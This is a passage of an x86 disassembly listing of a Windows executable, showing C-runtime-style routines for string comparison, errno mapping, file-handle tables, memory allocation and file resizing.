  4063b3:	59                   	pop    %ecx
  4063b4:	83 f8 3c             	cmp    $0x3c,%eax
  4063b7:	76 29                	jbe    0x4063e2
  4063b9:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  4063bf:	50                   	push   %eax
  4063c0:	e8 0b d5 ff ff       	call   0x4038d0
  4063c5:	8b f8                	mov    %eax,%edi
  4063c7:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  4063cd:	83 e8 3b             	sub    $0x3b,%eax
  4063d0:	6a 03                	push   $0x3
  4063d2:	03 f8                	add    %eax,%edi
  4063d4:	68 84 95 40 00       	push   $0x409584
  4063d9:	57                   	push   %edi
  4063da:	e8 01 14 00 00       	call   0x4077e0
  4063df:	83 c4 10             	add    $0x10,%esp
  4063e2:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4063e8:	68 68 95 40 00       	push   $0x409568
  4063ed:	50                   	push   %eax
  4063ee:	e8 ed d3 ff ff       	call   0x4037e0
  4063f3:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4063f9:	57                   	push   %edi
  4063fa:	50                   	push   %eax
  4063fb:	e8 f0 d3 ff ff       	call   0x4037f0
  406400:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  406406:	68 64 95 40 00       	push   $0x409564
  40640b:	50                   	push   %eax
  40640c:	e8 df d3 ff ff       	call   0x4037f0
  406411:	ff b6 8c ba 40 00    	push   0x40ba8c(%esi)
  406417:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40641d:	50                   	push   %eax
  40641e:	e8 cd d3 ff ff       	call   0x4037f0
  406423:	68 10 20 01 00       	push   $0x12010
  406428:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40642e:	68 3c 95 40 00       	push   $0x40953c
  406433:	50                   	push   %eax
  406434:	e8 1d 13 00 00       	call   0x407756
  406439:	83 c4 2c             	add    $0x2c,%esp
  40643c:	5f                   	pop    %edi
  40643d:	eb 26                	jmp    0x406465
  40643f:	8d 45 08             	lea    0x8(%ebp),%eax
  406442:	8d b6 8c ba 40 00    	lea    0x40ba8c(%esi),%esi
  406448:	6a 00                	push   $0x0
  40644a:	50                   	push   %eax
  40644b:	ff 36                	push   (%esi)
  40644d:	e8 7e d4 ff ff       	call   0x4038d0
  406452:	59                   	pop    %ecx
  406453:	50                   	push   %eax
  406454:	ff 36                	push   (%esi)
  406456:	6a f4                	push   $0xfffffff4
  406458:	ff 15 84 90 40 00    	call   *0x409084
  40645e:	50                   	push   %eax
  40645f:	ff 15 74 90 40 00    	call   *0x409074
  406465:	5e                   	pop    %esi
  406466:	c9                   	leave
  406467:	c3                   	ret
  406468:	cc                   	int3
  406469:	cc                   	int3
  40646a:	cc                   	int3
  40646b:	cc                   	int3
  40646c:	cc                   	int3
  40646d:	cc                   	int3
  40646e:	cc                   	int3
  40646f:	cc                   	int3
  406470:	8b 54 24 04          	mov    0x4(%esp),%edx
  406474:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406478:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40647e:	75 3c                	jne    0x4064bc
  406480:	8b 02                	mov    (%edx),%eax
  406482:	3a 01                	cmp    (%ecx),%al
  406484:	75 2e                	jne    0x4064b4
  406486:	0a c0                	or     %al,%al
  406488:	74 26                	je     0x4064b0
  40648a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40648d:	75 25                	jne    0x4064b4
  40648f:	0a e4                	or     %ah,%ah
  406491:	74 1d                	je     0x4064b0
  406493:	c1 e8 10             	shr    $0x10,%eax
  406496:	3a 41 02             	cmp    0x2(%ecx),%al
  406499:	75 19                	jne    0x4064b4
  40649b:	0a c0                	or     %al,%al
  40649d:	74 11                	je     0x4064b0
  40649f:	3a 61 03             	cmp    0x3(%ecx),%ah
  4064a2:	75 10                	jne    0x4064b4
  4064a4:	83 c1 04             	add    $0x4,%ecx
  4064a7:	83 c2 04             	add    $0x4,%edx
  4064aa:	0a e4                	or     %ah,%ah
  4064ac:	75 d2                	jne    0x406480
  4064ae:	8b ff                	mov    %edi,%edi
  4064b0:	33 c0                	xor    %eax,%eax
  4064b2:	c3                   	ret
  4064b3:	90                   	nop
  4064b4:	1b c0                	sbb    %eax,%eax
  4064b6:	d1 e0                	shl    $1,%eax
  4064b8:	40                   	inc    %eax
  4064b9:	c3                   	ret
  4064ba:	8b ff                	mov    %edi,%edi
  4064bc:	f7 c2 01 00 00 00    	test   $0x1,%edx
  4064c2:	74 14                	je     0x4064d8
  4064c4:	8a 02                	mov    (%edx),%al
  4064c6:	42                   	inc    %edx
  4064c7:	3a 01                	cmp    (%ecx),%al
  4064c9:	75 e9                	jne    0x4064b4
  4064cb:	41                   	inc    %ecx
  4064cc:	0a c0                	or     %al,%al
  4064ce:	74 e0                	je     0x4064b0
  4064d0:	f7 c2 02 00 00 00    	test   $0x2,%edx
  4064d6:	74 a8                	je     0x406480
  4064d8:	66 8b 02             	mov    (%edx),%ax
  4064db:	83 c2 02             	add    $0x2,%edx
  4064de:	3a 01                	cmp    (%ecx),%al
  4064e0:	75 d2                	jne    0x4064b4
  4064e2:	0a c0                	or     %al,%al
  4064e4:	74 ca                	je     0x4064b0
  4064e6:	3a 61 01             	cmp    0x1(%ecx),%ah
  4064e9:	75 c9                	jne    0x4064b4
  4064eb:	0a e4                	or     %ah,%ah
  4064ed:	74 c1                	je     0x4064b0
  4064ef:	83 c1 02             	add    $0x2,%ecx
  4064f2:	eb 8c                	jmp    0x406480
  4064f4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4064f8:	33 d2                	xor    %edx,%edx
  4064fa:	89 0d f0 bf 40 00    	mov    %ecx,0x40bff0
  406500:	b8 20 bb 40 00       	mov    $0x40bb20,%eax
  406505:	3b 08                	cmp    (%eax),%ecx
  406507:	74 20                	je     0x406529
  406509:	83 c0 08             	add    $0x8,%eax
  40650c:	42                   	inc    %edx
  40650d:	3d 88 bc 40 00       	cmp    $0x40bc88,%eax
  406512:	7c f1                	jl     0x406505
  406514:	83 f9 13             	cmp    $0x13,%ecx
  406517:	72 1d                	jb     0x406536
  406519:	83 f9 24             	cmp    $0x24,%ecx
  40651c:	77 18                	ja     0x406536
  40651e:	c7 05 ec bf 40 00 0d 	movl   $0xd,0x40bfec
  406525:	00 00 00 
  406528:	c3                   	ret
  406529:	8b 04 d5 24 bb 40 00 	mov    0x40bb24(,%edx,8),%eax
  406530:	a3 ec bf 40 00       	mov    %eax,0x40bfec
  406535:	c3                   	ret
  406536:	81 f9 bc 00 00 00    	cmp    $0xbc,%ecx
  40653c:	72 12                	jb     0x406550
  40653e:	81 f9 ca 00 00 00    	cmp    $0xca,%ecx
  406544:	c7 05 ec bf 40 00 08 	movl   $0x8,0x40bfec
  40654b:	00 00 00 
  40654e:	76 0a                	jbe    0x40655a
  406550:	c7 05 ec bf 40 00 16 	movl   $0x16,0x40bfec
  406557:	00 00 00 
  40655a:	c3                   	ret
  40655b:	53                   	push   %ebx
  40655c:	56                   	push   %esi
  40655d:	57                   	push   %edi
  40655e:	83 cb ff             	or     $0xffffffff,%ebx
  406561:	33 ff                	xor    %edi,%edi
  406563:	33 f6                	xor    %esi,%esi
  406565:	b9 20 d4 40 00       	mov    $0x40d420,%ecx
  40656a:	8b 01                	mov    (%ecx),%eax
  40656c:	85 c0                	test   %eax,%eax
  40656e:	74 37                	je     0x4065a7
  406570:	8d 90 00 01 00 00    	lea    0x100(%eax),%edx
  406576:	3b c2                	cmp    %edx,%eax
  406578:	73 1c                	jae    0x406596
  40657a:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  40657e:	74 05                	je     0x406585
  406580:	83 c0 08             	add    $0x8,%eax
  406583:	eb f1                	jmp    0x406576
  406585:	83 08 ff             	orl    $0xffffffff,(%eax)
  406588:	2b 01                	sub    (%ecx),%eax
  40658a:	c1 f8 03             	sar    $0x3,%eax
  40658d:	03 c6                	add    %esi,%eax
  40658f:	8b d8                	mov    %eax,%ebx
  406591:	83 fb ff             	cmp    $0xffffffff,%ebx
  406594:	75 54                	jne    0x4065ea
  406596:	83 c1 04             	add    $0x4,%ecx
  406599:	47                   	inc    %edi
  40659a:	83 c6 20             	add    $0x20,%esi
  40659d:	81 f9 20 d5 40 00    	cmp    $0x40d520,%ecx
  4065a3:	7c c5                	jl     0x40656a
  4065a5:	eb 43                	jmp    0x4065ea
  4065a7:	be 00 01 00 00       	mov    $0x100,%esi
  4065ac:	56                   	push   %esi
  4065ad:	e8 53 eb ff ff       	call   0x405105
  4065b2:	85 c0                	test   %eax,%eax
  4065b4:	59                   	pop    %ecx
  4065b5:	74 33                	je     0x4065ea
  4065b7:	83 05 20 d5 40 00 20 	addl   $0x20,0x40d520
  4065be:	8d 0c bd 20 d4 40 00 	lea    0x40d420(,%edi,4),%ecx
  4065c5:	8d 90 00 01 00 00    	lea    0x100(%eax),%edx
  4065cb:	89 01                	mov    %eax,(%ecx)
  4065cd:	3b c2                	cmp    %edx,%eax
  4065cf:	73 14                	jae    0x4065e5
  4065d1:	80 60 04 00          	andb   $0x0,0x4(%eax)
  4065d5:	83 08 ff             	orl    $0xffffffff,(%eax)
  4065d8:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  4065dc:	8b 11                	mov    (%ecx),%edx
  4065de:	83 c0 08             	add    $0x8,%eax
  4065e1:	03 d6                	add    %esi,%edx
  4065e3:	eb e8                	jmp    0x4065cd
  4065e5:	c1 e7 05             	shl    $0x5,%edi
  4065e8:	8b df                	mov    %edi,%ebx
  4065ea:	5f                   	pop    %edi
  4065eb:	8b c3                	mov    %ebx,%eax
  4065ed:	5e                   	pop    %esi
  4065ee:	5b                   	pop    %ebx
  4065ef:	c3                   	ret
  4065f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4065f4:	56                   	push   %esi
  4065f5:	3b 05 20 d5 40 00    	cmp    0x40d520,%eax
  4065fb:	57                   	push   %edi
  4065fc:	73 52                	jae    0x406650
  4065fe:	8b c8                	mov    %eax,%ecx
  406600:	8b f0                	mov    %eax,%esi
  406602:	c1 f9 05             	sar    $0x5,%ecx
  406605:	83 e6 1f             	and    $0x1f,%esi
  406608:	8d 3c 8d 20 d4 40 00 	lea    0x40d420(,%ecx,4),%edi
  40660f:	c1 e6 03             	shl    $0x3,%esi
  406612:	8b 0f                	mov    (%edi),%ecx
  406614:	83 3c 31 ff          	cmpl   $0xffffffff,(%ecx,%esi,1)
  406618:	75 36                	jne    0x406650
  40661a:	83 3d 34 b7 40 00 01 	cmpl   $0x1,0x40b734
  406621:	53                   	push   %ebx
  406622:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  406626:	75 1e                	jne    0x406646
  406628:	83 e8 00             	sub    $0x0,%eax
  40662b:	74 10                	je     0x40663d
  40662d:	48                   	dec    %eax
  40662e:	74 08                	je     0x406638
  406630:	48                   	dec    %eax
  406631:	75 13                	jne    0x406646
  406633:	53                   	push   %ebx
  406634:	6a f4                	push   $0xfffffff4
  406636:	eb 08                	jmp    0x406640
  406638:	53                   	push   %ebx
  406639:	6a f5                	push   $0xfffffff5
  40663b:	eb 03                	jmp    0x406640
  40663d:	53                   	push   %ebx
  40663e:	6a f6                	push   $0xfffffff6
  406640:	ff 15 c8 90 40 00    	call   *0x4090c8
  406646:	8b 07                	mov    (%edi),%eax
  406648:	89 1c 30             	mov    %ebx,(%eax,%esi,1)
  40664b:	33 c0                	xor    %eax,%eax
  40664d:	5b                   	pop    %ebx
  40664e:	eb 14                	jmp    0x406664
  406650:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  406657:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  40665e:	00 00 00 
  406661:	83 c8 ff             	or     $0xffffffff,%eax
  406664:	5f                   	pop    %edi
  406665:	5e                   	pop    %esi
  406666:	c3                   	ret
  406667:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40666b:	56                   	push   %esi
  40666c:	3b 0d 20 d5 40 00    	cmp    0x40d520,%ecx
  406672:	57                   	push   %edi
  406673:	73 55                	jae    0x4066ca
  406675:	8b c1                	mov    %ecx,%eax
  406677:	8b f1                	mov    %ecx,%esi
  406679:	c1 f8 05             	sar    $0x5,%eax
  40667c:	83 e6 1f             	and    $0x1f,%esi
  40667f:	8d 3c 85 20 d4 40 00 	lea    0x40d420(,%eax,4),%edi
  406686:	c1 e6 03             	shl    $0x3,%esi
  406689:	8b 07                	mov    (%edi),%eax
  40668b:	03 c6                	add    %esi,%eax
  40668d:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  406691:	74 37                	je     0x4066ca
  406693:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  406696:	74 32                	je     0x4066ca
  406698:	83 3d 34 b7 40 00 01 	cmpl   $0x1,0x40b734
  40669f:	75 1f                	jne    0x4066c0
  4066a1:	33 c0                	xor    %eax,%eax
  4066a3:	2b c8                	sub    %eax,%ecx
  4066a5:	74 10                	je     0x4066b7
  4066a7:	49                   	dec    %ecx
  4066a8:	74 08                	je     0x4066b2
  4066aa:	49                   	dec    %ecx
  4066ab:	75 13                	jne    0x4066c0
  4066ad:	50                   	push   %eax
  4066ae:	6a f4                	push   $0xfffffff4
  4066b0:	eb 08                	jmp    0x4066ba
  4066b2:	50                   	push   %eax
  4066b3:	6a f5                	push   $0xfffffff5
  4066b5:	eb 03                	jmp    0x4066ba
  4066b7:	50                   	push   %eax
  4066b8:	6a f6                	push   $0xfffffff6
  4066ba:	ff 15 c8 90 40 00    	call   *0x4090c8
  4066c0:	8b 07                	mov    (%edi),%eax
  4066c2:	83 0c 30 ff          	orl    $0xffffffff,(%eax,%esi,1)
  4066c6:	33 c0                	xor    %eax,%eax
  4066c8:	eb 14                	jmp    0x4066de
  4066ca:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  4066d1:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  4066d8:	00 00 00 
  4066db:	83 c8 ff             	or     $0xffffffff,%eax
  4066de:	5f                   	pop    %edi
  4066df:	5e                   	pop    %esi
  4066e0:	c3                   	ret
  4066e1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4066e5:	3b 05 20 d5 40 00    	cmp    0x40d520,%eax
  4066eb:	73 1c                	jae    0x406709
  4066ed:	8b c8                	mov    %eax,%ecx
  4066ef:	83 e0 1f             	and    $0x1f,%eax
  4066f2:	c1 f9 05             	sar    $0x5,%ecx
  4066f5:	8b 0c 8d 20 d4 40 00 	mov    0x40d420(,%ecx,4),%ecx
  4066fc:	f6 44 c1 04 01       	testb  $0x1,0x4(%ecx,%eax,8)
  406701:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  406704:	74 03                	je     0x406709
  406706:	8b 00                	mov    (%eax),%eax
  406708:	c3                   	ret
  406709:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  406710:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  406717:	00 00 00 
  40671a:	83 c8 ff             	or     $0xffffffff,%eax
  40671d:	c3                   	ret
  40671e:	8b 44 24 04          	mov    0x4(%esp),%eax
  406722:	3b 05 20 d5 40 00    	cmp    0x40d520,%eax
  406728:	73 3d                	jae    0x406767
  40672a:	8b c8                	mov    %eax,%ecx
  40672c:	8b d0                	mov    %eax,%edx
  40672e:	c1 f9 05             	sar    $0x5,%ecx
  406731:	83 e2 1f             	and    $0x1f,%edx
  406734:	8b 0c 8d 20 d4 40 00 	mov    0x40d420(,%ecx,4),%ecx
  40673b:	f6 44 d1 04 01       	testb  $0x1,0x4(%ecx,%edx,8)
  406740:	74 25                	je     0x406767
  406742:	50                   	push   %eax
  406743:	e8 99 ff ff ff       	call   0x4066e1
  406748:	59                   	pop    %ecx
  406749:	50                   	push   %eax
  40674a:	ff 15 cc 90 40 00    	call   *0x4090cc
  406750:	85 c0                	test   %eax,%eax
  406752:	75 08                	jne    0x40675c
  406754:	ff 15 6c 90 40 00    	call   *0x40906c
  40675a:	eb 02                	jmp    0x40675e
  40675c:	33 c0                	xor    %eax,%eax
  40675e:	85 c0                	test   %eax,%eax
  406760:	74 12                	je     0x406774
  406762:	a3 f0 bf 40 00       	mov    %eax,0x40bff0
  406767:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  40676e:	00 00 00 
  406771:	83 c8 ff             	or     $0xffffffff,%eax
  406774:	c3                   	ret
  406775:	53                   	push   %ebx
  406776:	56                   	push   %esi
  406777:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40677b:	57                   	push   %edi
  40677c:	0f af 74 24 14       	imul   0x14(%esp),%esi
  406781:	83 fe e0             	cmp    $0xffffffe0,%esi
  406784:	8b de                	mov    %esi,%ebx
  406786:	77 0d                	ja     0x406795
  406788:	85 f6                	test   %esi,%esi
  40678a:	75 03                	jne    0x40678f
  40678c:	6a 01                	push   $0x1
  40678e:	5e                   	pop    %esi
  40678f:	83 c6 0f             	add    $0xf,%esi
  406792:	83 e6 f0             	and    $0xfffffff0,%esi
  406795:	33 ff                	xor    %edi,%edi
  406797:	83 fe e0             	cmp    $0xffffffe0,%esi
  40679a:	77 2a                	ja     0x4067c6
  40679c:	3b 1d a0 be 40 00    	cmp    0x40bea0,%ebx
  4067a2:	77 0d                	ja     0x4067b1
  4067a4:	53                   	push   %ebx
  4067a5:	e8 0a 06 00 00       	call   0x406db4
  4067aa:	8b f8                	mov    %eax,%edi
  4067ac:	59                   	pop    %ecx
  4067ad:	85 ff                	test   %edi,%edi
  4067af:	75 2b                	jne    0x4067dc
  4067b1:	56                   	push   %esi
  4067b2:	6a 08                	push   $0x8
  4067b4:	ff 35 e0 c3 40 00    	push   0x40c3e0
  4067ba:	ff 15 90 90 40 00    	call   *0x409090
  4067c0:	8b f8                	mov    %eax,%edi
  4067c2:	85 ff                	test   %edi,%edi
  4067c4:	75 22                	jne    0x4067e8
  4067c6:	83 3d 4c c1 40 00 00 	cmpl   $0x0,0x40c14c
  4067cd:	74 19                	je     0x4067e8
  4067cf:	56                   	push   %esi
  4067d0:	e8 30 02 00 00       	call   0x406a05
  4067d5:	85 c0                	test   %eax,%eax
  4067d7:	59                   	pop    %ecx
  4067d8:	74 14                	je     0x4067ee
  4067da:	eb b9                	jmp    0x406795
  4067dc:	53                   	push   %ebx
  4067dd:	6a 00                	push   $0x0
  4067df:	57                   	push   %edi
  4067e0:	e8 fb 10 00 00       	call   0x4078e0
  4067e5:	83 c4 0c             	add    $0xc,%esp
  4067e8:	8b c7                	mov    %edi,%eax
  4067ea:	5f                   	pop    %edi
  4067eb:	5e                   	pop    %esi
  4067ec:	5b                   	pop    %ebx
  4067ed:	c3                   	ret
  4067ee:	33 c0                	xor    %eax,%eax
  4067f0:	eb f8                	jmp    0x4067ea
  4067f2:	56                   	push   %esi
  4067f3:	57                   	push   %edi
  4067f4:	6a 03                	push   $0x3
  4067f6:	33 ff                	xor    %edi,%edi
  4067f8:	5e                   	pop    %esi
  4067f9:	39 35 00 d4 40 00    	cmp    %esi,0x40d400
  4067ff:	7e 44                	jle    0x406845
  406801:	a1 f8 c3 40 00       	mov    0x40c3f8,%eax
  406806:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  406809:	85 c0                	test   %eax,%eax
  40680b:	74 2f                	je     0x40683c
  40680d:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  406811:	74 0d                	je     0x406820
  406813:	50                   	push   %eax
  406814:	e8 1f 11 00 00       	call   0x407938
  406819:	83 f8 ff             	cmp    $0xffffffff,%eax
  40681c:	59                   	pop    %ecx
  40681d:	74 01                	je     0x406820
  40681f:	47                   	inc    %edi
  406820:	83 fe 14             	cmp    $0x14,%esi
  406823:	7c 17                	jl     0x40683c
  406825:	a1 f8 c3 40 00       	mov    0x40c3f8,%eax
  40682a:	ff 34 b0             	push   (%eax,%esi,4)
  40682d:	e8 47 e9 ff ff       	call   0x405179
  406832:	a1 f8 c3 40 00       	mov    0x40c3f8,%eax
  406837:	59                   	pop    %ecx
  406838:	83 24 b0 00          	andl   $0x0,(%eax,%esi,4)
  40683c:	46                   	inc    %esi
  40683d:	3b 35 00 d4 40 00    	cmp    0x40d400,%esi
  406843:	7c bc                	jl     0x406801
  406845:	8b c7                	mov    %edi,%eax
  406847:	5f                   	pop    %edi
  406848:	5e                   	pop    %esi
  406849:	c3                   	ret
  40684a:	55                   	push   %ebp
  40684b:	8b ec                	mov    %esp,%ebp
  40684d:	b8 00 10 00 00       	mov    $0x1000,%eax
  406852:	e8 39 11 00 00       	call   0x407990
  406857:	53                   	push   %ebx
  406858:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40685b:	56                   	push   %esi
  40685c:	33 f6                	xor    %esi,%esi
  40685e:	3b 1d 20 d5 40 00    	cmp    0x40d520,%ebx
  406864:	0f 83 15 01 00 00    	jae    0x40697f
  40686a:	8b c3                	mov    %ebx,%eax
  40686c:	8b cb                	mov    %ebx,%ecx
  40686e:	c1 f8 05             	sar    $0x5,%eax
  406871:	83 e1 1f             	and    $0x1f,%ecx
  406874:	8b 04 85 20 d4 40 00 	mov    0x40d420(,%eax,4),%eax
  40687b:	f6 44 c8 04 01       	testb  $0x1,0x4(%eax,%ecx,8)
  406880:	0f 84 f9 00 00 00    	je     0x40697f
  406886:	6a 01                	push   $0x1
  406888:	56                   	push   %esi
  406889:	53                   	push   %ebx
  40688a:	e8 8e da ff ff       	call   0x40431d
  40688f:	83 c4 0c             	add    $0xc,%esp
  406892:	83 f8 ff             	cmp    $0xffffffff,%eax
  406895:	89 45 08             	mov    %eax,0x8(%ebp)
  406898:	0f 84 eb 00 00 00    	je     0x406989
  40689e:	6a 02                	push   $0x2
  4068a0:	56                   	push   %esi
  4068a1:	53                   	push   %ebx
  4068a2:	e8 76 da ff ff       	call   0x40431d
  4068a7:	83 c4 0c             	add    $0xc,%esp
  4068aa:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068ad:	0f 84 d6 00 00 00    	je     0x406989
  4068b3:	57                   	push   %edi
  4068b4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4068b7:	2b f8                	sub    %eax,%edi
  4068b9:	85 ff                	test   %edi,%edi
  4068bb:	7e 6f                	jle    0x40692c
  4068bd:	68 00 10 00 00       	push   $0x1000
  4068c2:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4068c8:	56                   	push   %esi
  4068c9:	50                   	push   %eax
  4068ca:	e8 11 10 00 00       	call   0x4078e0
  4068cf:	68 00 80 00 00       	push   $0x8000
  4068d4:	53                   	push   %ebx
  4068d5:	e8 4a e4 ff ff       	call   0x404d24
  4068da:	83 c4 14             	add    $0x14,%esp
  4068dd:	89 45 0c             	mov    %eax,0xc(%ebp)
  4068e0:	b8 00 10 00 00       	mov    $0x1000,%eax
  4068e5:	3b f8                	cmp    %eax,%edi
  4068e7:	7d 02                	jge    0x4068eb
  4068e9:	8b c7                	mov    %edi,%eax
  4068eb:	50                   	push   %eax
  4068ec:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  4068f2:	50                   	push   %eax
  4068f3:	53                   	push   %ebx
  4068f4:	e8 81 d6 ff ff       	call   0x403f7a
  4068f9:	83 c4 0c             	add    $0xc,%esp
  4068fc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4068ff:	74 08                	je     0x406909
  406901:	2b f8                	sub    %eax,%edi
  406903:	85 ff                	test   %edi,%edi
  406905:	7e 18                	jle    0x40691f
  406907:	eb d7                	jmp    0x4068e0
  406909:	83 3d f0 bf 40 00 05 	cmpl   $0x5,0x40bff0
  406910:	75 0a                	jne    0x40691c
  406912:	c7 05 ec bf 40 00 0d 	movl   $0xd,0x40bfec
  406919:	00 00 00 
  40691c:	83 ce ff             	or     $0xffffffff,%esi
  40691f:	ff 75 0c             	push   0xc(%ebp)
  406922:	53                   	push   %ebx
  406923:	e8 fc e3 ff ff       	call   0x404d24
  406928:	59                   	pop    %ecx
  406929:	59                   	pop    %ecx
  40692a:	eb 40                	jmp    0x40696c
  40692c:	7d 3e                	jge    0x40696c
  40692e:	6a 00                	push   $0x0
  406930:	ff 75 0c             	push   0xc(%ebp)
  406933:	53                   	push   %ebx
  406934:	e8 e4 d9 ff ff       	call   0x40431d
  406939:	53                   	push   %ebx
  40693a:	e8 a2 fd ff ff       	call   0x4066e1
  40693f:	83 c4 10             	add    $0x10,%esp
  406942:	50                   	push   %eax
  406943:	ff 15 d0 90 40 00    	call   *0x4090d0
  406949:	8b f0                	mov    %eax,%esi
  40694b:	f7 de                	neg    %esi
  40694d:	1b f6                	sbb    %esi,%esi
  40694f:	f7 de                	neg    %esi
  406951:	4e                   	dec    %esi
  406952:	83 fe ff             	cmp    $0xffffffff,%esi
  406955:	75 15                	jne    0x40696c
  406957:	c7 05 ec bf 40 00 0d 	movl   $0xd,0x40bfec
  40695e:	00 00 00 
  406961:	ff 15 6c 90 40 00    	call   *0x40906c
  406967:	a3 f0 bf 40 00       	mov    %eax,0x40bff0
  40696c:	6a 00                	push   $0x0
  40696e:	ff 75 08             	push   0x8(%ebp)
  406971:	53                   	push   %ebx
  406972:	e8 a6 d9 ff ff       	call   0x40431d
  406977:	83 c4 0c             	add    $0xc,%esp
  40697a:	8b c6                	mov    %esi,%eax
  40697c:	5f                   	pop    %edi
  40697d:	eb 0d                	jmp    0x40698c
  40697f:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  406986:	00 00 00 
  406989:	83 c8 ff             	or     $0xffffffff,%eax
  40698c:	5e                   	pop    %esi
  40698d:	5b                   	pop    %ebx
  40698e:	c9                   	leave
  40698f:	c3                   	ret
  406990:	55                   	push   %ebp
  406991:	8b ec                	mov    %esp,%ebp
  406993:	51                   	push   %ecx
  406994:	8b 45 08             	mov    0x8(%ebp),%eax
  406997:	8d 48 01             	lea    0x1(%eax),%ecx
  40699a:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4069a0:	77 0c                	ja     0x4069ae
  4069a2:	8b 0d 88 bc 40 00    	mov    0x40bc88,%ecx
  4069a8:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  4069ac:	eb 52                	jmp    0x406a00
  4069ae:	8b c8                	mov    %eax,%ecx
  4069b0:	56                   	push   %esi
  4069b1:	8b 35 88 bc 40 00    	mov    0x40bc88,%esi
  4069b7:	c1 f9 08             	sar    $0x8,%ecx
  4069ba:	0f b6 d1             	movzbl %cl,%edx
  4069bd:	f6 44 56 01 80       	testb  $0x80,0x1(%esi,%edx,2)
  4069c2:	5e                   	pop    %esi
  4069c3:	74 0e                	je     0x4069d3
  4069c5:	80 65 fe 00          	andb   $0x0,-0x2(%ebp)
  4069c9:	88 4d fc             	mov    %cl,-0x4(%ebp)
  4069cc:	88 45 fd             	mov    %al,-0x3(%ebp)
  4069cf:	6a 02                	push   $0x2
  4069d1:	eb 09                	jmp    0x4069dc
  4069d3:	80 65 fd 00          	andb   $0x0,-0x3(%ebp)
  4069d7:	88 45 fc             	mov    %al,-0x4(%ebp)
  4069da:	6a 01                	push   $0x1
  4069dc:	58                   	pop    %eax
  4069dd:	8d 4d 0a             	lea    0xa(%ebp),%ecx
  4069e0:	6a 01                	push   $0x1
  4069e2:	6a 00                	push   $0x0
  4069e4:	6a 00                	push   $0x0
  4069e6:	51                   	push   %ecx
  4069e7:	50                   	push   %eax
  4069e8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4069eb:	50                   	push   %eax
  4069ec:	6a 01                	push   $0x1
  4069ee:	e8 cc 0f 00 00       	call   0x4079bf
  4069f3:	83 c4 1c             	add    $0x1c,%esp
  4069f6:	85 c0                	test   %eax,%eax
  4069f8:	75 02                	jne    0x4069fc
  4069fa:	c9                   	leave
  4069fb:	c3                   	ret
  4069fc:	0f b7 45 0a          	movzwl 0xa(%ebp),%eax
  406a00:	23 45 0c             	and    0xc(%ebp),%eax
  406a03:	c9                   	leave
  406a04:	c3                   	ret
  406a05:	a1 50 c1 40 00       	mov    0x40c150,%eax
  406a0a:	85 c0                	test   %eax,%eax
  406a0c:	74 0f                	je     0x406a1d
  406a0e:	ff 74 24 04          	push   0x4(%esp)
  406a12:	ff d0                	call   *%eax
  406a14:	85 c0                	test   %eax,%eax
  406a16:	59                   	pop    %ecx
  406a17:	74 04                	je     0x406a1d
  406a19:	6a 01                	push   $0x1
  406a1b:	58                   	pop    %eax
  406a1c:	c3                   	ret
  406a1d:	33 c0                	xor    %eax,%eax
  406a1f:	c3                   	ret
  406a20:	68 40 01 00 00       	push   $0x140
  406a25:	6a 00                	push   $0x0
  406a27:	ff 35 e0 c3 40 00    	push   0x40c3e0
  406a2d:	ff 15 90 90 40 00    	call   *0x409090
  406a33:	85 c0                	test   %eax,%eax
  406a35:	a3 dc c3 40 00       	mov    %eax,0x40c3dc
  406a3a:	75 01                	jne    0x406a3d
  406a3c:	c3                   	ret
  406a3d:	83 25 d4 c3 40 00 00 	andl   $0x0,0x40c3d4
  406a44:	83 25 d8 c3 40 00 00 	andl   $0x0,0x40c3d8
  406a4b:	6a 01                	push   $0x1
  406a4d:	a3 d0 c3 40 00       	mov    %eax,0x40c3d0
  406a52:	c7 05 c8 c3 40 00 10 	movl   $0x10,0x40c3c8
  406a59:	00 00 00 
  406a5c:	58                   	pop    %eax
  406a5d:	c3                   	ret
  406a5e:	a1 d8 c3 40 00       	mov    0x40c3d8,%eax
  406a63:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  406a66:	a1 dc c3 40 00       	mov    0x40c3dc,%eax
  406a6b:	8d 0c 88             	lea    (%eax,%ecx,4),%ecx
  406a6e:	3b c1                	cmp    %ecx,%eax
  406a70:	73 14                	jae    0x406a86
  406a72:	8b 54 24 04          	mov    0x4(%esp),%edx
